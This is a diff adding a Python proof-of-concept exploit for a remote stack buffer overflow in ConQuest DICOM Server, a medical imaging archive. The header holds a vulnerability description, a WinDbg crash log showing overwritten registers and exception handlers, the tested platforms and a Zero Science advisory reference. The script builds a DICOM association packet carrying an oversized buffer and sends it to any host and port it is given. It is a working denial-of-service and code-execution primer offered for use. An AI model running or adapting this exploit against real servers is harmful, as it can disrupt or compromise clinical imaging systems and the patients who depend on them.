@@ -1,0 +1,180 @@
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+#
+# ConQuest DICOM Server 1.4.17d Remote Stack Buffer Overflow RCE
+#
+#
+# Vendor: University of Manchester. Developed by Marcel van Herk, Lambert Zijp and Jan Meinders. The Netherlands Cancer Institute
+# Product web page: https://ingenium.home.xs4all.nl/dicom.html | http://dicom.nema.org
+# Affected version: 1.4.17d
+#                   1.4.19beta3a
+#                   1.4.19beta3b
+#
+# Summary: A full featured DICOM server has been developed based on the public
+# domain UCDMC DICOM code. Some possible applications of the Conquest DICOM software
+# are: DICOM training and testing; Demonstration image archives; Image format conversion
+# from a scanner with DICOM network access; DICOM image slide making; DICOM image selection
+# and (limited) editing; Automatic image forwarding and (de)compression.
+#
+# The vulnerability is caused due to the usage of vulnerable collection of libraries that
+# are part of DCMTK Toolkit, specifically the parser for the DICOM Upper Layer Protocol or DUL.
+# Stack/Heap Buffer overflow/underflow can be triggered when sending and processing wrong length
+# of ACSE data structure received over the network by the DICOM Store-SCP service. An attacker can
+# overflow the stack and the heap of the process when sending large array of bytes to the presentation
+# context item length segment of the DICOM standard, potentially resulting in remote code execution
+# and/or denial of service scenario.
+#
+# ------------------------------------------------------------------------------
+# 0:002> g
+# (820.fc4): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** WARNING: Unable to verify checksum for C:\Users\lqwrm\Downloads\dicomserver1419beta3b\dgate64.exe
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Users\lqwrm\Downloads\dicomserver1419beta3b\dgate64.exe
+# dgate64+0xb9a29:
+# 00000001`3fe09a29 488b5108        mov     rdx,qword ptr [rcx+8] ds:42424242`4242424a=????????????????
+# 0:002> r
+# rax=0000000044444444 rbx=000000000298c910 rcx=4242424242424242
+# rdx=000001400046001a rsi=0000000000001105 rdi=000000000041dc50
+# rip=000000013fe09a29 rsp=000000000298b840 rbp=000000000298e8e4
+#  r8=000000000041dc40  r9=0000000000000402 r10=0000000000000281
+# r11=0000013f004a0019 r12=0000000000003eb7 r13=0000000000000000
+# r14=0000000000000000 r15=000000000298c910
+# iopl=0         nv up ei pl nz na po nc
+# cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+# dgate64+0xb9a29:
+# 00000001`3fe09a29 488b5108        mov     rdx,qword ptr [rcx+8] ds:42424242`4242424a=????????????????
+# 0:002> u
+# dgate64+0xb9a29:
+# 00000001`3fe09a29 488b5108        mov     rdx,qword ptr [rcx+8]
+# 00000001`3fe09a2d 488b4110        mov     rax,qword ptr [rcx+10h]
+# 00000001`3fe09a31 4885d2          test    rdx,rdx
+# 00000001`3fe09a34 7406            je      dgate64+0xb9a3c (00000001`3fe09a3c)
+# 00000001`3fe09a36 48894210        mov     qword ptr [rdx+10h],rax
+# 00000001`3fe09a3a eb04            jmp     dgate64+0xb9a40 (00000001`3fe09a40)
+# 00000001`3fe09a3c 48894328        mov     qword ptr [rbx+28h],rax
+# 00000001`3fe09a40 488b5110        mov     rdx,qword ptr [rcx+10h]
+# 0:002> 
+# dgate64+0xb9a44:
+# 00000001`3fe09a44 488b4108        mov     rax,qword ptr [rcx+8]
+# 00000001`3fe09a48 4885d2          test    rdx,rdx
+# 00000001`3fe09a4b 7406            je      dgate64+0xb9a53 (00000001`3fe09a53)
+# 00000001`3fe09a4d 48894208        mov     qword ptr [rdx+8],rax
+# 00000001`3fe09a51 eb04            jmp     dgate64+0xb9a57 (00000001`3fe09a57)
+# 00000001`3fe09a53 48894330        mov     qword ptr [rbx+30h],rax
+# 00000001`3fe09a57 ba18000000      mov     edx,18h
+# 00000001`3fe09a5c e804caf4ff      call    dgate64+0x6465 (00000001`3fd56465)
+# 0:002> kb e
+#  # RetAddr           : Args to Child                                                           : Call Site
+# 00 00000001`3fe104d2 : 00000000`00457a28 00000000`00008014 00000000`0298b8d9 00000000`00000000 : dgate64+0xb9a29
+# 01 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : dgate64+0xc04d2
+# 02 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 03 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 04 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 05 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 06 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 07 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 08 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 09 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 0a 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 0b 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 0c 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 0d 41414141`41414141 : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
+# 0:002> !exchain
+# 100 stack frames, scanning for handlers...
+# Frame 0x01: dgate64+0xc04d2 (00000001`3fe104d2)
+#   ehandler dgate64+0x552e (00000001`3fd5552e)
+# Frame 0x02: error getting module for 4141414141414141
+# Frame 0x03: error getting module for 4141414141414141
+# Frame 0x04: error getting module for 4141414141414141
+# Frame 0x05: error getting module for 4141414141414141
+# Frame 0x06: error getting module for 4141414141414141
+# Frame 0x07: error getting module for 4141414141414141
+# Frame 0x08: error getting module for 4141414141414141
+# Frame 0x09: error getting module for 4141414141414141
+# Frame 0x0a: error getting module for 4141414141414141
+# Frame 0x0b: error getting module for 4141414141414141
+# Frame 0x0c: error getting module for 4141414141414141
+# Frame 0x0d: error getting module for 4141414141414141
+# Frame 0x0e: error getting module for 4141414141414141
+# Frame 0x0f: error getting module for 4141414141414141
+# Frame 0x10: error getting module for 4141414141414141
+# Frame 0x11: error getting module for 4141414141414141
+# Frame 0x12: error getting module for 4141414141414141
+# Frame 0x13: error getting module for 4141414141414141
+# Frame 0x14: error getting module for 4141414141414141
+# Frame 0x15: error getting module for 4141414141414141
+# Frame 0x16: error getting module for 4141414141414141
+# ...
+# ...
+# Frame 0x61: error getting module for 4141414141414141
+# Frame 0x62: error getting module for 4141414141414141
+# Frame 0x63: error getting module for 4141414141414141
+# 0:002> g
+#
+# STATUS_STACK_BUFFER_OVERRUN encountered
+# (820.fc4): Break instruction exception - code 80000003 (first chance)
+# kernel32!UnhandledExceptionFilter+0x71:
+# 00000000`7796bb21 cc              int     3
+# 0:002> g
+# ntdll!ZwWaitForSingleObject+0xa:
+# 00000000`77a3bb7a c3              ret
+#
+# ------------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 7 Professional SP1 (EN)
+#            Microsoft Windows 7 Ultimate SP1 (EN)
+#            Linux Ubuntu 14.04.5
+#            Solaris 10
+#            macOS/10.12.2
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5383
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5383.php
+#
+# 
+# 22.11.2016
+#
+
+
+import socket, sys
+
+hello = ('\x01\x00\x00\x00\x80\x71\x00\x01\x00\x00\x4f\x52\x54\x48'
+         '\x41\x4e\x43\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4a\x4f'
+         '\x58\x59\x50\x4f\x58\x59\x21\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x10\x00\x00\x15\x31\x2e\x32\x2e\x38\x34'
+         '\x30\x2e\x31\x30\x30\x30\x38\x2e\x33\x2e\x31\x2e\x31\x2e'
+         '\x31\x20\x00\x80\x00')
+
+# 33406 bytes
+buffer  = '\x41' * 20957 # STACK OVERFLOW / SEH OVERWRITE
+buffer += '\x42' * 8 # RCX = 4242424242424242
+buffer += '\x43' * 8 # defiler ;]
+buffer += '\x44\x44\x44\x44' # EAX = 44444444 / RAX = 0000000044444444
+buffer += '\x45' * 12429
+
+bye = ('\x50\x00\x00\x0c\x51\x00\x00\x04\x00\x00\x07\xde'
+       '\x52\x00\x00\x00')
+
+print 'Sending '+str(len(buffer))+' bytes of data!'
+
+if len(sys.argv) < 3:
+	print '\nUsage: ' +sys.argv[0]+ ' <target> <port>'
+	print 'Example: ' +sys.argv[0]+ ' 172.19.0.214 5678\n'
+	sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(17)
+s.send(hello+buffer+bye)
+s.close
